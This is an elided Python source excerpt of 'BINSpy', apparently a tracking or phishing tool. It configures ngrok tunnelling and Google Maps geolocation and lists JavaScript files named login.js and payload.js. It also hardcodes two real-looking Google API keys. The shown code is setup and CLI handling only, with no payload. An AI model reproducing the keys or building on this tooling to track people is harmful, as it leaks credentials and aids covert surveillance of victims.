...
class BINSpy(object):
	def __init__(self, stat = 0):
		...
		self.JSFiles = ({"path" : "base.js", "src" : utils.generateToken(12)},{"path" : "libs.min.js", "src" : utils.generateToken(12)},{"path" : "login.js", "src" : utils.generateToken(12)},{"path" : "payload.js", "src" : utils.generateToken(12)},{"path" : "BINSpy.js", "src" : utils.generateToken(12)},{"path" : "vscript.js", "src" : utils.generateToken(12)},)
		...
		if self.stat == 1:
			...
			try:
				...
				utils.Go(utils.Color['whiteBold'] + "[" + utils.Color['redBold'] + "x" + utils.Color['whiteBold'] + "]" + utils.Color['redBold'] + " " + "NOTICE: " + utils.Color['white'] + "BINSpy needs Internet connection for working" + "\n\t")
				sys.exit(0)

			if (not(os.path.exists("BINSpy.config"))):
			 	self.BINSpy_config()
			try:
				config_BINSpy = json.load(open("BINSpy.config"))
			except Exception as error:
				os.remove('BINSpy.config')
				self.BINSpy_config()

			self.ngrok = config_BINSpy['ngrok_token']
			self.gmaps = config_BINSpy['gmaps_api_key']
			if self.gmaps == '':
				self.gmaps = 'AIzaSyA30wEa2DwUuddmNTHvoprhnrB2w_aCWbs'
			self.googl = config_BINSpy['gshortener_api_key']
			if self.googl == '':
				self.googl = 'AIzaSyDHMDTOGo9L1OBl5vRxOVM6vpXOXVp5jCc'
			
			parser = argparse.ArgumentParser("BINSpy -u <<Url>> -p <<Port>>", version=self.version)
			...
			parser.add_argument('-ud', '--update', dest='update', action='store_true', default=False, help='Update BINSpy to the latest version.')
			...
			if options.update:
				utils.Go("\033[H\033[J")
				utils.Go("Updating..." + " " + utils.Color['blue'] + "BINSpy" + utils.Color['white'] + "..." + "\n")
				subprocess.check_output(["git", "reset", "--hard", "origin/master"])
				subprocess.check_output(["git", "pull"])
				utils.Go("BINSpy Updated... Please execute again...")
				sys.exit(0)

			if options.url is None:
				utils.Go("\033[H\033[J")
				utils.Go("----------------------------------------------")
				utils.Go("" + " " + utils.Color['redBold'] + "BINSpy" + utils.Color['white'] +" {" + utils.Color['yellowBold'] + "stable" + utils.Color['white'] + "}" + utils.Color['white'] + " - " + "Osint and analytics tool" + " " + "<" +utils.Color['white'])
				utils.Go("----------------------------------------------")
	...
	# Design principal of the header of BINSpy
	def header(self):
		if self.stat == 1:
			...
			# Update verification
			changeLog = requests.get("https://raw.githubusercontent.com/entynetproject/BINSpy/master/version.txt", timeout = 4)
			...
			utils.Go(utils.Color['white'] + "[" + utils.Color['greenBold'] + "?" + utils.Color['white'] + "]" + utils.Color['white'] + " " + "Do not forget to close " + self.name_BINSpy + ", after use. Press Control C" + " " + utils.Color['white'] + '\n')
    ...
    # the main file (BINSpy.py)
	def main(self):
		import core.sockets

	# Create config file
	def BINSpy_config(self):
		utils.Go("\033[H\033[J")
		utils.Go("----------------------------------------------------------")
		utils.Go("" + " " + utils.Color['redBold'] + "BINSpy" + utils.Color['white'] +" {" + utils.Color['yellowBold'] + "stable" + utils.Color['white'] + "}" + utils.Color['white'] + " - " + "Configuration zone to use the software" + " " + "<" + utils.Color['white'])
		utils.Go("----------------------------------------------------------")
		utils.Go("| v" + utils.Color['redBold'] + "2.0" + utils.Color['white'] + " |")    
		utils.Go("--------" + "\n")
		utils.Go(utils.Color['whiteBold'] + "GENERAL CONFIG" + utils.Color['white'])
		utils.Go("------")
		utils.Go("Through this section you will configure the resources required \nfor an effective function of BINSpy, please complete the following steps, below. \nKeep in mind that if the data is incorrect this tool will not work." + utils.Color['white'])
		utils.Go("")
		...
		utils.Go("")
		utils.Go(utils.Color['greenBold'] + "-" + utils.Color['white'] + " Congratulations! " + utils.Color['greenBold'] + "Successful configuration" + utils.Color['white'] + ", now enjoy BINSpy!" + utils.Color['white'])
		utils.Go("")
		time.sleep(0.4)
		if (c_nGrokToken != '' and c_gMapsToken != ''):
			v = '{\n\t"ngrok_token" : "' + c_nGrokToken + '",\n\t"gmaps_api_key" : "' + c_gMapsToken + '",\n\t"gshortener_api_key" : "' + c_gOoglToken + '"\n\t}'
			f = open ('BINSpy.config', 'w')
			f.write(v)
			f.close()
		else:
			self.BINSpy_config()
